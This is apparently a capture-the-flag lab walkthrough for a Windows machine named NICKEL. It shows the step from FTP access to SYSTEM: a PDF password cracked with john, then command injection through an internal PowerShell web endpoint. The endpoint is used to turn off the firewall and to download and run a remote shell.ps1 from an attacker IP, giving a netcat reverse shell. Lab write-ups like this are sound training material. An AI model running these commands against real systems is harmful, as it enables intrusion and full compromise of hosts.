# 6 :21 ftp > root

```
# using ariah:NowiseSloopTheory139 we can log onto ftp and download Infrastrucutre.pdf
# password protected; using pdf2john.py and using john to crack it

$ john --wordlist=/usr/share/wordlists/rockyou.txt pdfhash
Created directory: /home/kashz/.john
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ariah4168        (Infrastructure.pdf)
1g 0:00:00:21 DONE (2021-08-20 14:35) 0.04668g/s 467050p/s 467050c/s 467050C/s arian69..ariadne01
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed


$ open Infrastructure.pdf
Infrastructure Notes
Temporary Command endpoint: http://nickel/?
Backup system: http://nickel-backup/backup
NAS: http://corp-nas/files

# seems like port 80 is working internally as there's no port shown in the links above.

ariah@NICKEL C:\Users\ariah>netstat -anot
Active Connections
TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4        InHost

ariah@NICKEL C:\Users\ariah>curl http://localhost:80
<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
        <pre></pre>
</body></html>

# as said => Temporary Command endpoint: http://nickel/?

ariah@NICKEL C:\Users\ariah>curl http://localhost:80/?whoami
<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
<pre>nt authority\system
</pre>
</body></html>

# we can enable verbose to get more information
ariah@NICKEL C:\Users\ariah>curl -v http://localhost:80/?whoami
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> GET /?whoami HTTP/1.1
> Host: localhost
> User-Agent: curl/7.55.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Length: 118
< Last-Modified: Fri, 20 Aug 2021 19:19:53 GMT
< Server: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0
< Date: Sat, 21 Aug 2021 02:19:53 GMT
<
<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
        <pre>nt authority\system
</pre>
</body></html>* Connection #0 to host localhost left intact


# server is running: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0
# we need to url encode all chars before sending

ariah@NICKEL C:\Users\ariah>curl http://localhost:80 --data-urlencode "whoami"
<!doctype html><html><body>Incorrect Parameter</body></html>

# when using --data-urlencode makes the request as POST
# to force the request as get, -G

ariah@NICKEL C:\Users\ariah>curl -G http://localhost:80 --data-urlencode "whoami"
<!doctype html><html><body>dev-api started at 2020-10-20T10:38:24
        <pre>nt authority\system
</pre>
</body></html>

# firewall is running, so disable that
ariah@NICKEL C:\Users\ariah>curl -G http://localhost:80 --data-urlencode "netsh advfirewall set allprofiles state off"

ariah@NICKEL C:\Users\ariah>curl -G http://localhost:80 --data-urlencode "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.154/shell.ps1')"

$ nc -lvnp 7070
listening on [any] 7070 ...
connect to [192.168.49.154] from (UNKNOWN) [192.168.154.99] 49722
Windows PowerShell running as user NICKEL$ on NICKEL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
```
